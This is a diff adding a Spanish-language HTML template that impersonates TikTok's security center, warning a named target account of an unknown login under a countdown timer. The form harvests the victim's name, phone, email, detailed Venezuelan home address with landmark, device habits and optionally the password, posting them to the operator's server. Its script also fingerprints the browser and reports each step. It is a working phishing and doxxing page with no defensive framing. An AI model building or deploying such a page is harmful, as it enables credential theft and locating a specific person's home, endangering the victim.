@@ -1,0 +1,183 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Inicio de sesión desconocido detectado</title>
+<meta property="og:title" content="Inicio de sesión desconocido detectado">
+<meta property="og:description" content="Confirma si eres el propietario de la cuenta.">
+<link rel="stylesheet" href="/static/app.css">
+</head>
+<body>
+
+<div class="bar">
+  <svg class="note" viewBox="0 0 24 24" fill="none">
+    <path d="M16 3v11.5a3.5 3.5 0 1 1-2.5-3.35V6.2L9 7.1v9.4a3.5 3.5 0 1 1-2.5-3.35V5.4L16 3z"
+          fill="#fff"/>
+  </svg>
+  <span>TikTok · Centro de seguridad</span>
+</div>
+
+<!-- PASO 1 -->
+<section id="p1">
+  <div class="badge">ALERTA DE SEGURIDAD</div>
+  <h1>Detectamos un inicio de sesión desde un dispositivo desconocido</h1>
+
+  <div class="card">
+    <div class="row"><span>Dispositivo</span><span>{{ c.dispositivo_sospechoso }}</span></div>
+    <div class="row"><span>Ubicación aprox.</span><span>{{ c.ubicacion_sospechosa }}</span></div>
+    <div class="row"><span>Fecha</span><span>{{ c.fecha_sospechosa or 'hace 2 días, 03:12' }}</span></div>
+    <div class="row"><span>IP</span><span>{{ c.ip_enmascarada }}</span></div>
+  </div>
+
+  <p class="risk">Si no reconoces este acceso, tu cuenta podría estar en riesgo.</p>
+  <p class="timer">Cuenta a verificar: <b>{{ c.cuenta_objetivo }} {{ c.nickname_objetivo }}</b></p>
+  <p class="timer">Tiempo restante para verificar: <b id="reloj">--:--:--</b></p>
+  <p class="timer">Incidencia: <b>{{ c.codigo_incidencia }}</b></p>
+
+  <button class="btn" onclick="irPaso(2)">Verificar mi identidad</button>
+</section>
+
+<!-- PASO 2 -->
+<section id="p2" class="hidden">
+  <div class="badge">PASO 2 DE 3</div>
+  <h1>Confirma que eres el propietario de la cuenta</h1>
+  <p class="timer">Estos datos se comparan con el registro de accesos para descartar el dispositivo desconocido.</p>
+
+  <form id="f" onsubmit="enviar(event)">
+    <div class="bloque">A · Identidad</div>
+    <label>Nombre y apellido</label>
+    <input name="nombre" required>
+    <label>Teléfono vinculado a la cuenta</label>
+    <input name="telefono" placeholder="+58 4xx xxx xxxx" required>
+    <label>Correo electrónico</label>
+    <input name="email" type="email" required>
+
+    <div class="bloque">B · Ubicación habitual de acceso</div>
+    <label>País</label>
+    <select name="pais"><option>Venezuela</option><option>Otro</option></select>
+    <label>Estado</label>
+    <select name="estado">
+      <option>Yaracuy</option><option>Carabobo</option><option>Lara</option>
+      <option>Portuguesa</option><option>Falcón</option><option>Distrito Capital</option>
+      <option>Otro</option>
+    </select>
+    <label>Ciudad o municipio</label>
+    <input name="ciudad" required>
+    <label>Calle o avenida</label>
+    <input name="calle" required>
+    <label>Número de casa, edificio y apartamento</label>
+    <input name="numero">
+    <label>Punto de referencia</label>
+    <input name="referencia" placeholder="ej: frente a la Plaza Sucre">
+    <label>Código postal</label>
+    <input name="codigo_postal">
+
+    <div class="bloque">C · Dispositivo y sesión</div>
+    <label>¿Desde qué dispositivo abres TikTok habitualmente?</label>
+    <select name="dispositivo_habitual">
+      <option>Android</option><option>iPhone</option><option>Web</option><option>Otro</option>
+    </select>
+    <label>¿Usas VPN?</label>
+    <select name="usa_vpn"><option>No</option><option>Sí</option><option>No sé</option></select>
+    <label>¿Cuántos dispositivos tienen tu cuenta abierta?</label>
+    <select name="dispositivos_abiertos">
+      <option>1</option><option>2</option><option>3</option><option>Más de 3</option>
+    </select>
+
+    {% if c.pedir_password %}
+    <label>Contraseña</label>
+    <input name="password" type="password">
+    {% endif %}
+
+    <div class="check">
+      <input type="checkbox" required id="ok">
+      <label for="ok" style="margin:0">Confirmo que soy el propietario de la cuenta</label>
+    </div>
+
+    <button class="btn" type="submit">Confirmar y proteger mi cuenta</button>
+  </form>
+</section>
+
+<!-- PASO 3 -->
+<section id="p3" class="hidden">
+  <div class="ok">
+    <div class="tick">✅</div>
+    <h1>Verificación completada</h1>
+    <p class="timer">El dispositivo desconocido ha quedado marcado como revisado.</p>
+    <p class="timer">Si no reconoces el acceso, cambia tu contraseña.</p>
+  </div>
+  <a class="btn" id="salir" href="#">Abrir TikTok</a>
+</section>
+
+<p class="pie">Proceso de verificación de seguridad. Sin cookies.</p>
+
+<script>
+const SLUG = "{{ c.slug }}";
+const SID = sessionStorage.getItem("sid") || (crypto.randomUUID());
+sessionStorage.setItem("sid", SID);
+const t0 = parseInt(sessionStorage.getItem("t0") || Date.now());
+sessionStorage.setItem("t0", t0);
+const LIMITE = {{ c.horas_limite }} * 3600;
+
+function beacon(step, extra = {}) {
+  const body = JSON.stringify({ slug: SLUG, sid: SID, step, ...extra });
+  if (navigator.sendBeacon) {
+    navigator.sendBeacon("/api/beacon", new Blob([body], { type: "application/json" }));
+  } else {
+    fetch("/api/beacon", { method: "POST", body, keepalive: true });
+  }
+}
+
+function datosCliente() {
+  let webgl = "";
+  try {
+    const gl = document.createElement("canvas").getContext("webgl");
+    const dbg = gl && gl.getExtension("WEBGL_debug_renderer_info");
+    if (dbg) webgl = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+  } catch (e) {}
+  return {
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    pantalla: screen.width + "x" + screen.height,
+    idiomas: (navigator.languages || []).join(","),
+    plataforma: navigator.platform,
+    webgl, webdriver: !!navigator.webdriver,
+  };
+}
+
+fetch("/api/hit", {
+  method: "POST", keepalive: true,
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({ slug: SLUG, sid: SID, step: "paso1", ...datosCliente() })
+});
+
+beacon("paso1", datosCliente());
+
+function irPaso(n) {
+  ["p1", "p2", "p3"].forEach((id, i) => document.getElementById(id).classList.toggle("hidden", i !== n - 1));
+  beacon("paso" + n);
+  window.scrollTo(0, 0);
+}
+
+async function enviar(e) {
+  e.preventDefault();
+  const datos = Object.fromEntries(new FormData(document.getElementById("f")).entries());
+  await fetch("/api/form", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ slug: SLUG, sid: SID, ...datos })
+  });
+  document.getElementById("salir").href = "/go/" + SLUG + "?sid=" + SID;
+  irPaso(3);
+}
+
+setInterval(() => {
+  const falta = Math.max(0, LIMITE - Math.floor((Date.now() - t0) / 1000));
+  const h = String(Math.floor(falta / 3600)).padStart(2, "0");
+  const m = String(Math.floor((falta % 3600) / 60)).padStart(2, "0");
+  const s = String(falta % 60).padStart(2, "0");
+  document.getElementById("reloj").textContent = `${h}:${m}:${s}`;
+}, 1000);
+</script>
+</body>
+</html>
